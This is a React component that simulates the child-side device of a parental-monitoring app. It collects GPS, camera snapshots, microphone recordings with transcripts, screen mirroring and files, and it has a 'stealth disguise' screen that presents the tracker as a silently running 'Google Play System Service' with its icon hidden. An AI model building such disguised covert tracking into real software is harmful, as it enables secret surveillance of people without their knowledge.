import React, { useState, useEffect, useRef } from 'react';
import { ChildDeviceState, AudioClipItem, DeviceFile } from '../types';
import { 
  Smartphone, 
  Lock, 
  CheckCircle2, 
  ShieldAlert, 
  Globe, 
  EyeOff, 
  AlertTriangle, 
  Wifi, 
  Battery, 
  Camera, 
  Settings, 
  Sparkles, 
  Mic, 
  MapPin, 
  RefreshCw, 
  Eye, 
  Shield, 
  Upload, 
  Volume2, 
  Clock, 
  Play, 
  Square,
  FileText
} from 'lucide-react';

interface ChildDeviceSimulatorProps {
  deviceState: ChildDeviceState;
  onUpdateChildState: (updates: Partial<ChildDeviceState>) => void;
  onTriggerSOS: () => void;
  onOpenSetupGuide: () => void;
  onSendCommand?: (command: string, payload?: any) => void;
}

export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
  deviceState,
  onUpdateChildState,
  onTriggerSOS,
  onOpenSetupGuide,
  onSendCommand
}) => {
  const [browserUrl, setBrowserUrl] = useState('https://kids.nationalgeographic.com');
  const [customWebText, setCustomWebText] = useState('Explore amazing facts about wild animals, science, space, and historic events.');
  const [sosAlertSent, setSosAlertSent] = useState(false);
  const [isRecordingAudio, setIsRecordingAudio] = useState(false);
  const [recordingSeconds, setRecordingSeconds] = useState(0);

  // Real Hardware State
  const [locationPermission, setLocationPermission] = useState<'granted' | 'denied' | 'prompt'>('prompt');
  const [cameraPermission, setCameraPermission] = useState<'granted' | 'denied' | 'prompt'>('prompt');
  const [micPermission, setMicPermission] = useState<'granted' | 'denied' | 'prompt'>('prompt');
  const [storagePermission, setStoragePermission] = useState<'granted' | 'denied' | 'prompt'>('prompt');

  const [isCapturingCamera, setIsCapturingCamera] = useState(false);
  const [realBattery, setRealBattery] = useState<number | null>(null);
  const [pairingCode, setPairingCode] = useState<string>(deviceState.pairingCode || '592-104');
  
  // Stealth Disguise Simulator
  const [isDisguised, setIsDisguised] = useState(false);
  const [activeScreenInDisguise, setActiveScreenInDisguise] = useState<'home' | 'settings' | 'apps' | 'appInfo'>('home');
  const [currentTimeStr, setCurrentTimeStr] = useState('');

  // Live Screen Share
  const [isRealSharing, setIsRealSharing] = useState(false);
  const [mediaStream, setMediaStream] = useState<MediaStream | null>(null);

  // Audio Recorder Ref
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);
  const speechRecognizerRef = useRef<any>(null);
  const fileInputRef = useRef<HTMLInputElement | null>(null);

  // Live Clock Update
  useEffect(() => {
    const updateClock = () => {
      const d = new Date();
      setCurrentTimeStr(d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }));
    };
    updateClock();
    const timer = setInterval(updateClock, 1000);
    return () => clearInterval(timer);
  }, []);

  // Battery detection & Pairing Code
  useEffect(() => {
    let savedCode = localStorage.getItem('child_pairing_code');
    if (!savedCode) {
      const codePart1 = Math.floor(100 + Math.random() * 900);
      const codePart2 = Math.floor(100 + Math.random() * 900);
      savedCode = `${codePart1}-${codePart2}`;
      localStorage.setItem('child_pairing_code', savedCode);
    }
    setPairingCode(savedCode);

    if ('getBattery' in navigator) {
      (navigator as any).getBattery().then((battery: any) => {
        setRealBattery(Math.round(battery.level * 100));
        onUpdateChildState({ 
          batteryLevel: Math.round(battery.level * 100), 
          isCharging: battery.charging,
          pairingCode: savedCode || ''
        });
      }).catch(() => {});
    }
  }, []);

  // 1. Real GPS Geolocation Request
  const requestRealLocation = () => {
    if (!navigator.geolocation) {
      alert("GPS is not supported by this device/browser.");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        setLocationPermission('granted');
        const lat = position.coords.latitude;
        const lng = position.coords.longitude;
        
        onUpdateChildState({
          location: {
            lat,
            lng,
            address: `Live Mobile GPS (${lat.toFixed(5)}, ${lng.toFixed(5)})`,
            speed: Math.round((position.coords.speed || 0) * 3.6),
            accuracy: Math.round(position.coords.accuracy),
            altitude: Math.round(position.coords.altitude || 0),
            timestamp: new Date().toISOString(),
            batteryAtLocation: realBattery || deviceState.batteryLevel
          }
        });
      },
      (err) => {
        setLocationPermission('denied');
        console.warn("Location permission:", err.message);
      },
      { enableHighAccuracy: true }
    );
  };

  // 2. Real Camera Capture (Takes actual photo from device camera)
  const requestRealCamera = async () => {
    try {
      setIsCapturingCamera(true);
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
      });
      setCameraPermission('granted');

      const videoEl = document.createElement('video');
      videoEl.srcObject = stream;
      videoEl.setAttribute('playsinline', 'true');
      videoEl.muted = true;
      await videoEl.play();

      const canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext('2d');
      ctx?.drawImage(videoEl, 0, 0, 640, 480);
      const dataUrl = canvas.toDataURL('image/jpeg', 0.7);

      // Stop camera stream tracks
      stream.getTracks().forEach(track => track.stop());
      setIsCapturingCamera(false);

      onUpdateChildState({
        latestCameraSnapshot: dataUrl,
        cameraSnapshotTimestamp: new Date().toISOString(),
        isCameraStreaming: true,
        activeCamera: 'front'
      });
    } catch (err: any) {
      setIsCapturingCamera(false);
      setCameraPermission('denied');
      console.warn("Camera permission error:", err.message);
    }
  };

  // 3. Real Web Audio Microphone Recording & Live Speech Recognition
  const startRealAudioRecording = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      setMicPermission('granted');
      setIsRecordingAudio(true);
      setRecordingSeconds(0);
      audioChunksRef.current = [];

      // MediaRecorder for actual audio blob
      const mediaRecorder = new MediaRecorder(stream);
      mediaRecorderRef.current = mediaRecorder;

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          audioChunksRef.current.push(e.data);
        }
      };

      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunksRef.current, { type: 'audio/webm' });
        const reader = new FileReader();
        reader.readAsDataURL(audioBlob);
        reader.onloadend = () => {
          const base64Audio = reader.result as string;
          const newClip: AudioClipItem = {
            id: `clip-${Date.now()}`,
            title: `Ambient Voice Clip (${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })})`,
            timestamp: `Today, ${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}`,
            duration: `00:${recordingSeconds < 10 ? '0' : ''}${recordingSeconds}`,
            transcript: "Live ambient recording captured from child phone microphone.",
            audioData: base64Audio,
            severity: 'safe'
          };

          if (onSendCommand) {
            onSendCommand('SAVE_AUDIO_CLIP', { clip: newClip });
          }
        };
        stream.getTracks().forEach(track => track.stop());
      };

      mediaRecorder.start();

      // Web Speech API for real live transcript
      const SpeechClass = (window as any).SpeechRecognition || (window as any).webkitSpeechRecognition;
      if (SpeechClass) {
        const recognizer = new SpeechClass();
        recognizer.continuous = true;
        recognizer.interimResults = true;
        recognizer.onresult = (event: any) => {
          const transcript = Array.from(event.results)
            .map((result: any) => result[0].transcript)
            .join(' ');
          onUpdateChildState({
            audioState: {
              ...deviceState.audioState,
              isListening: true,
              lastTranscript: transcript || "Spoken voice detected."
            }
          });
        };
        recognizer.start();
        speechRecognizerRef.current = recognizer;
      }

    } catch (err: any) {
      setMicPermission('denied');
      setIsRecordingAudio(false);
      console.warn("Microphone error:", err.message);
    }
  };

  const stopRealAudioRecording = () => {
    setIsRecordingAudio(false);
    if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
      mediaRecorderRef.current.stop();
    }
    if (speechRecognizerRef.current) {
      speechRecognizerRef.current.stop();
    }
    onUpdateChildState({
      audioState: {
        ...deviceState.audioState,
        isListening: false
      }
    });
  };

  // Timer while recording
  useEffect(() => {
    let timer: any;
    if (isRecordingAudio) {
      timer = setInterval(() => setRecordingSeconds(s => s + 1), 1000);
    }
    return () => clearInterval(timer);
  }, [isRecordingAudio]);

  // 4. Real File Uploader
  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.readAsDataURL(file);
    reader.onloadend = () => {
      const dataUrl = reader.result as string;
      let folder: DeviceFile['folder'] = 'Documents';
      if (file.type.startsWith('image/')) folder = 'Photos';
      else if (file.type.startsWith('audio/')) folder = 'Voice Recordings';
      else if (file.type.includes('download')) folder = 'Downloads';

      const newFile: DeviceFile = {
        id: `file-${Date.now()}`,
        name: file.name,
        folder,
        size: `${(file.size / (1024 * 1024)).toFixed(1)} MB`,
        date: 'Just now',
        dataUrl,
        isFlagged: file.name.endsWith('.apk')
      };

      if (onSendCommand) {
        onSendCommand('UPLOAD_FILE', { file: newFile });
      }
      setStoragePermission('granted');
    };
  };

  // 5. Live Screen Share (DisplayMedia Webcast)
  const startRealScreenShare = async () => {
    try {
      const stream = await navigator.mediaDevices.getDisplayMedia({
        video: { width: 320, height: 480, frameRate: 5 },
        audio: false
      });
      setMediaStream(stream);
      setIsRealSharing(true);

      const video = document.createElement('video');
      video.srcObject = stream;
      video.setAttribute('playsinline', 'true');
      video.muted = true;
      video.play().catch(() => {});

      const canvas = document.createElement('canvas');
      canvas.width = 300;
      canvas.height = 450;
      const ctx = canvas.getContext('2d');

      const intervalId = setInterval(() => {
        if (stream.active && ctx) {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const screenshot = canvas.toDataURL('image/jpeg', 0.6);
          onUpdateChildState({
            currentScreenImage: screenshot,
            currentApp: 'Live Screen Mirror',
            currentScreenTitle: 'Webcast sharing active window/screen'
          });
        } else {
          clearInterval(intervalId);
          stream.getTracks().forEach(track => track.stop());
          setIsRealSharing(false);
          onUpdateChildState({
            currentScreenImage: null,
            currentApp: 'Chrome Browser',
            currentScreenTitle: browserUrl
          });
        }
      }, 1500);

      (window as any)._screenShareInterval = intervalId;

    } catch (err: any) {
      console.warn("Screen sharing cancelled:", err);
    }
  };

  const stopRealScreenShare = () => {
    if (mediaStream) {
      mediaStream.getTracks().forEach(track => track.stop());
    }
    if ((window as any)._screenShareInterval) {
      clearInterval((window as any)._screenShareInterval);
    }
    setMediaStream(null);
    setIsRealSharing(false);
    onUpdateChildState({
      currentScreenImage: null,
      currentApp: 'Chrome Browser',
      currentScreenTitle: browserUrl
    });
  };

  const handleTransmitScreen = () => {
    onUpdateChildState({
      currentApp: 'Chrome Browser',
      currentScreenTitle: browserUrl,
      currentScreenContent: customWebText
    });
  };

  const handleSOS = () => {
    setSosAlertSent(true);
    onTriggerSOS();
    setTimeout(() => setSosAlertSent(false), 5000);
  };

  const handleGenerateNewCode = () => {
    const codePart1 = Math.floor(100 + Math.random() * 900);
    const codePart2 = Math.floor(100 + Math.random() * 900);
    const newCode = `${codePart1}-${codePart2}`;
    setPairingCode(newCode);
    localStorage.setItem('child_pairing_code', newCode);
    onUpdateChildState({ pairingCode: newCode });
  };

  // Check if current app is blocked
  const isCurrentAppBlocked = deviceState.blockedApps?.includes('Google Chrome') || deviceState.blockedApps?.includes('Chrome Browser');

  return (
    <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
      
      {/* LEFT: Child Simulated Phone (5 cols) */}
      <div className="lg:col-span-5 max-w-sm mx-auto w-full">
        <div className="bg-slate-950 border-[8px] border-slate-900 rounded-[38px] overflow-hidden shadow-2xl relative min-h-[640px] flex flex-col text-slate-800">
          
          {/* Top Speaker/Camera Bar */}
          <div className="bg-slate-900 h-6 flex items-center justify-center relative">
            <div className="w-16 h-3 bg-black rounded-full absolute -bottom-1 z-50 flex items-center justify-center gap-1.5 px-3">
              <span className="w-1.5 h-1.5 rounded-full bg-slate-800" />
              <span className="w-4 h-1 bg-slate-800 rounded-full" />
            </div>
          </div>

          {/* Phone Screen Container */}
          <div className="p-4 bg-slate-50 flex-1 flex flex-col justify-between relative">
            
            {/* Phone Header Status Bar */}
            <div className="flex items-center justify-between text-[11px] font-bold text-slate-500 border-b border-slate-200 pb-2">
              <span className="flex items-center gap-1">
                <Wifi className="w-3.5 h-3.5 text-slate-600" />
                <span>Connected</span>
              </span>
              <span className="font-mono">{currentTimeStr || '10:15 AM'}</span>
              <span className="flex items-center gap-1">
                <Battery className="w-4 h-4 text-slate-600" />
                <span>{realBattery || deviceState.batteryLevel}%</span>
              </span>
            </div>

            {/* Simulated Hidden/Stealth Disguise Mode */}
            {isDisguised && (
              <div className="absolute inset-0 z-40 bg-slate-950 text-white flex flex-col font-sans">
                {activeScreenInDisguise === 'home' && (
                  <div className="flex-1 flex flex-col justify-between p-4 bg-gradient-to-b from-slate-900 via-zinc-950 to-slate-900">
                    <div className="text-center pt-8">
                      <div className="text-4xl font-extralight tracking-tight text-white/90">{currentTimeStr}</div>
                      <div className="text-xs text-white/60 mt-1 font-light">Today</div>
                    </div>

                    {/* App Grid Launcher (NO Guardian Shield tracker icon is visible here) */}
                    <div className="grid grid-cols-4 gap-x-2 gap-y-6 pt-4 px-1">
                      <div className="flex flex-col items-center gap-1.5">
                        <div className="w-11 h-11 rounded-2xl bg-gradient-to-tr from-blue-500 to-indigo-600 flex items-center justify-center shadow-lg border border-white/10">
                          <Globe className="w-5 h-5 text-white" />
                        </div>
                        <span className="text-[10px] font-medium text-white/80 text-center truncate w-full">Chrome</span>
                      </div>

                      <div className="flex flex-col items-center gap-1.5">
                        <div className="w-11 h-11 rounded-2xl bg-gradient-to-tr from-emerald-500 to-teal-600 flex items-center justify-center shadow-lg border border-white/10">
                          <Camera className="w-5 h-5 text-white" />
                        </div>
                        <span className="text-[10px] font-medium text-white/80 text-center truncate w-full">Camera</span>
                      </div>

                      <div className="flex flex-col items-center gap-1.5">
                        <div className="w-11 h-11 rounded-2xl bg-gradient-to-tr from-amber-500 to-orange-600 flex items-center justify-center shadow-lg border border-white/10">
                          <MapPin className="w-5 h-5 text-white" />
                        </div>
                        <span className="text-[10px] font-medium text-white/80 text-center truncate w-full">Maps</span>
                      </div>

                      <div className="flex flex-col items-center gap-1.5 cursor-pointer" onClick={() => setActiveScreenInDisguise('settings')}>
                        <div className="w-11 h-11 rounded-2xl bg-gradient-to-tr from-slate-700 to-slate-800 flex items-center justify-center shadow-lg border border-white/15 animate-pulse">
                          <Settings className="w-5 h-5 text-white" />
                        </div>
                        <span className="text-[10px] font-bold text-white text-center truncate w-full">Settings</span>
                      </div>
                    </div>

                    <div className="p-3 bg-emerald-950/40 border border-emerald-500/20 rounded-xl text-center space-y-1">
                      <span className="text-[9px] font-bold text-emerald-400 uppercase tracking-wider block">
                        Stealth System Service Active
                      </span>
                      <p className="text-[8px] text-slate-300">Tracking icon is hidden from launcher.</p>
                      <button
                        onClick={() => setIsDisguised(false)}
                        className="text-[9px] text-indigo-400 font-bold hover:underline mt-1"
                      >
                        Exit Disguise Mode →
                      </button>
                    </div>
                  </div>
                )}

                {activeScreenInDisguise === 'settings' && (
                  <div className="flex-1 flex flex-col bg-slate-900 text-slate-100 p-4 justify-between">
                    <div className="space-y-3">
                      <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                        <button onClick={() => setActiveScreenInDisguise('home')} className="text-xs text-indigo-400 font-bold">
                          ← Back to Home
                        </button>
                        <span className="text-xs font-bold uppercase text-slate-400">Settings</span>
                      </div>

                      <div className="p-3 bg-slate-950 rounded-xl border border-slate-800 space-y-1.5 text-xs text-slate-300">
                        <div className="flex justify-between">
                          <span className="text-slate-400">Disguise Name:</span>
                          <span className="font-bold text-emerald-400">Google Play System Service</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-slate-400">Daemon Status:</span>
                          <span className="font-bold text-emerald-400">Running Silently</span>
                        </div>
                      </div>
                    </div>

                    <button
                      onClick={() => setIsDisguised(false)}
                      className="w-full py-2 bg-indigo-600 hover:bg-indigo-700 text-white font-bold text-xs rounded-xl"
                    >
                      Restore Agent Dashboard
                    </button>
                  </div>
                )}
              </div>
            )}

            {/* Blocked App Screen Overlay */}
            {isCurrentAppBlocked && !deviceState.isLocked && (
              <div className="absolute inset-0 bg-red-950/95 text-white z-40 flex flex-col items-center justify-center p-6 text-center">
                <ShieldAlert className="w-12 h-12 text-red-500 mb-3 animate-pulse" />
                <h3 className="font-bold text-base mb-1">Application Restricted</h3>
                <p className="text-xs text-red-200 leading-relaxed mb-4">
                  Google Chrome has been restricted by your parent.
                </p>
                <span className="text-[10px] font-mono bg-red-900/60 px-3 py-1 rounded-full border border-red-700">
                  Guardian Shield Parental Policy
                </span>
              </div>
            )}

            {/* Locked Device Screen Overlay */}
            {deviceState.isLocked && (
              <div className="absolute inset-0 bg-slate-950/95 z-50 flex flex-col items-center justify-center text-center p-6 text-white">
                <div className="w-16 h-16 rounded-full bg-red-900/40 border border-red-600 flex items-center justify-center text-red-500 mb-4 animate-bounce">
                  <Lock className="w-8 h-8" />
                </div>
                <h3 className="text-base font-bold text-white mb-2">Device Screen Locked</h3>
                <p className="text-xs text-slate-300 px-3 leading-relaxed bg-slate-900 py-3 rounded-xl mb-4 border border-slate-800">
                  {deviceState.customLockMessage || "Screen time limit reached. Talk to your parent."}
                </p>
                <p className="text-[10px] text-slate-400 uppercase tracking-widest font-mono">
                  Guardian Shield Protection
                </p>
              </div>
            )}

            {/* Main Phone Body */}
            <div className="flex-1 py-3 flex flex-col justify-start space-y-3">
              
              <div className="text-center space-y-0.5">
                <Smartphone className="w-6 h-6 text-orange-600 mx-auto" />
                <h2 className="font-bold text-xs text-slate-900 uppercase tracking-wider">Child Tracking Agent</h2>
                <span className="px-2 py-0.5 rounded-full bg-emerald-50 text-emerald-700 text-[10px] font-bold border border-emerald-200">
                  Background Daemon Active
                </span>
              </div>

              {/* CONNECTION CODE CARD */}
              <div className="p-2.5 bg-white rounded-2xl border border-slate-200 space-y-1 text-center shadow-3xs">
                <span className="text-[9px] font-bold uppercase text-slate-400 tracking-wider block">
                  Unique Connection Code
                </span>
                <div className="text-xl font-black font-mono text-slate-900 tracking-widest bg-slate-50 py-1 rounded-xl border border-slate-200">
                  {pairingCode}
                </div>
                <button
                  type="button"
                  onClick={handleGenerateNewCode}
                  className="w-full py-0.5 bg-slate-50 hover:bg-slate-100 text-slate-700 text-[10px] font-semibold rounded-lg border border-slate-200"
                >
                  Regenerate Code
                </button>
              </div>

              {/* SENSOR & HARDWARE ACCESS MODULE */}
              <div className="space-y-1">
                <span className="text-[9px] font-bold uppercase text-slate-400 tracking-wider block">
                  Hardware Sensors & Media
                </span>
                
                <div className="grid grid-cols-2 gap-1.5">
                  <button
                    onClick={requestRealLocation}
                    className={`py-1.5 px-1 rounded-xl border text-center transition-all ${
                      locationPermission === 'granted'
                        ? 'bg-emerald-50 border-emerald-200 text-emerald-800'
                        : 'bg-white border-slate-200 text-slate-700 hover:bg-slate-50'
                    }`}
                  >
                    <MapPin className="w-3.5 h-3.5 mx-auto mb-0.5 text-orange-600" />
                    <span className="text-[10px] font-bold block">Update GPS</span>
                  </button>

                  <button
                    onClick={requestRealCamera}
                    disabled={isCapturingCamera}
                    className={`py-1.5 px-1 rounded-xl border text-center transition-all ${
                      cameraPermission === 'granted'
                        ? 'bg-emerald-50 border-emerald-200 text-emerald-800'
                        : 'bg-white border-slate-200 text-slate-700 hover:bg-slate-50'
                    }`}
                  >
                    <Camera className="w-3.5 h-3.5 mx-auto mb-0.5 text-purple-600" />
                    <span className="text-[10px] font-bold block">
                      {isCapturingCamera ? 'Capturing...' : 'Real Camera'}
                    </span>
                  </button>

                  <button
                    onClick={isRecordingAudio ? stopRealAudioRecording : startRealAudioRecording}
                    className={`py-1.5 px-1 rounded-xl border text-center transition-all ${
                      isRecordingAudio
                        ? 'bg-red-600 text-white border-red-700 animate-pulse'
                        : micPermission === 'granted'
                        ? 'bg-emerald-50 border-emerald-200 text-emerald-800'
                        : 'bg-white border-slate-200 text-slate-700 hover:bg-slate-50'
                    }`}
                  >
                    <Mic className="w-3.5 h-3.5 mx-auto mb-0.5" />
                    <span className="text-[10px] font-bold block">
                      {isRecordingAudio ? `Recording (${recordingSeconds}s)` : 'Record Voice'}
                    </span>
                  </button>

                  <button
                    onClick={() => fileInputRef.current?.click()}
                    className="py-1.5 px-1 rounded-xl border bg-white border-slate-200 text-slate-700 hover:bg-slate-50 text-center"
                  >
                    <Upload className="w-3.5 h-3.5 mx-auto mb-0.5 text-teal-600" />
                    <span className="text-[10px] font-bold block">Send File</span>
                  </button>
                  <input
                    ref={fileInputRef}
                    type="file"
                    className="hidden"
                    onChange={handleFileUpload}
                  />
                </div>
              </div>

              {/* STEALTH DISGUISE ACTION BUTTON */}
              <div className="p-2.5 bg-slate-100 border border-slate-200 rounded-2xl text-center space-y-1">
                <span className="text-[9px] font-bold text-slate-500 uppercase tracking-wider block">
                  Stealth Disguise Mode
                </span>
                <button
                  onClick={() => {
                    setIsDisguised(true);
                    setActiveScreenInDisguise('home');
                  }}
                  className="w-full py-1.5 bg-indigo-600 hover:bg-indigo-700 text-white font-bold text-[11px] rounded-xl shadow-3xs flex items-center justify-center gap-1.5 transition-colors"
                >
                  <EyeOff className="w-3.5 h-3.5" />
                  <span>Activate App Disguise Simulation</span>
                </button>
              </div>

            </div>

            {/* EMERGENCY SOS BUTTON */}
            <div className="pt-2 border-t border-slate-200">
              <button
                onClick={handleSOS}
                className={`w-full py-2.5 rounded-xl text-xs font-bold transition-all shadow-xs flex items-center justify-center gap-1.5 ${
                  sosAlertSent
                    ? 'bg-red-700 text-white animate-pulse'
                    : 'bg-red-600 hover:bg-red-700 text-white'
                }`}
              >
                <ShieldAlert className="w-4 h-4" />
                {sosAlertSent ? 'SOS ALARM TRANSMITTING...' : 'TRIGGER EMERGENCY SOS'}
              </button>
            </div>

          </div>
          
          {/* Phone Bottom Pill */}
          <div className="bg-slate-900 h-6 flex items-center justify-center">
            <div className="w-20 h-1 bg-slate-700 rounded-full" />
          </div>
        </div>
      </div>

      {/* RIGHT: Active Sim controls (7 cols) */}
      <div className="lg:col-span-7 space-y-6">
        
        {/* Browser Activity Simulator */}
        <div className="bg-white border border-slate-200 rounded-2xl p-5 shadow-xs space-y-4">
          <div className="flex items-center gap-2 border-b border-slate-100 pb-2.5">
            <Globe className="w-4 h-4 text-indigo-600" />
            <h3 className="font-bold text-sm text-slate-900">Browser Screen & Webcast Activity</h3>
          </div>
          
          <p className="text-xs text-slate-500 leading-relaxed">
            Update the simulated active website content or share your live browser screen. All activity synchronizes in real-time with the Parent Dashboard and Gemini AI Safety Radar.
          </p>

          <div className="space-y-3 text-xs">
            <div>
              <label className="font-bold text-slate-700 block mb-1">Simulated URL</label>
              <input
                type="text"
                value={browserUrl}
                onChange={(e) => setBrowserUrl(e.target.value)}
                placeholder="https://example.com"
                className="w-full bg-slate-50 border border-slate-200 rounded-xl px-3 py-2 text-xs font-mono text-slate-800 focus:outline-none focus:border-indigo-500"
              />
            </div>

            <div>
              <label className="font-bold text-slate-700 block mb-1">Webpage Body Text</label>
              <textarea
                value={customWebText}
                onChange={(e) => setCustomWebText(e.target.value)}
                placeholder="Type webpage text to test Gemini AI Safety radar..."
                rows={3}
                className="w-full bg-slate-50 border border-slate-200 rounded-xl p-3 text-xs text-slate-800 focus:outline-none focus:border-indigo-500 resize-none font-sans"
              />
            </div>

            <button
              onClick={handleTransmitScreen}
              className="w-full py-2 bg-indigo-600 hover:bg-indigo-700 text-white font-bold text-xs rounded-xl transition-all shadow-xs"
            >
              Transmit Screen Text to Parent Dashboard
            </button>

            {/* Real Screencast Sharing */}
            <div className="border-t border-slate-100 pt-3 flex flex-col gap-2">
              <span className="font-bold text-slate-700 text-xs block">Live Browser Screen Mirroring (Webcast)</span>
              {isRealSharing ? (
                <button
                  type="button"
                  onClick={stopRealScreenShare}
                  className="w-full py-2 bg-red-600 hover:bg-red-700 text-white font-bold text-xs rounded-xl transition-all shadow-xs flex items-center justify-center gap-1.5"
                >
                  <span className="w-2 h-2 rounded-full bg-white animate-pulse" />
                  <span>Stop Live Screen Cast</span>
                </button>
              ) : (
                <button
                  type="button"
                  onClick={startRealScreenShare}
                  className="w-full py-2 bg-emerald-600 hover:bg-emerald-700 text-white font-bold text-xs rounded-xl transition-all shadow-xs flex items-center justify-center gap-1.5"
                >
                  <Eye className="w-4 h-4" />
                  <span>Start Live Webcast (Share Browser Screen)</span>
                </button>
              )}
              <p className="text-[10px] text-slate-500">
                Shares a live video feed of your selected browser tab/window to the Parent Dashboard.
              </p>
            </div>
          </div>
        </div>

        {/* Multi-Device Sync Explanation */}
        <div className="bg-white border border-slate-200 rounded-2xl p-5 shadow-xs space-y-3">
          <div className="flex items-center gap-2 border-b border-slate-100 pb-2">
            <Shield className="w-4 h-4 text-orange-600" />
            <h3 className="font-bold text-sm text-slate-900">Real-Time Cloud Synchronization</h3>
          </div>

          <div className="text-xs text-slate-600 leading-relaxed space-y-1.5">
            <p>
              • <b>Two Device Setup:</b> Open this app on your phone in Child Mode and open it on your PC/laptop in Parent Mode.
            </p>
            <p>
              • <b>Pairing Code:</b> Enter pairing code <code className="font-bold text-orange-600">{pairingCode}</code> on the Parent Dashboard to pair instantly across different networks!
            </p>
          </div>
        </div>

      </div>

    </div>
  );
};
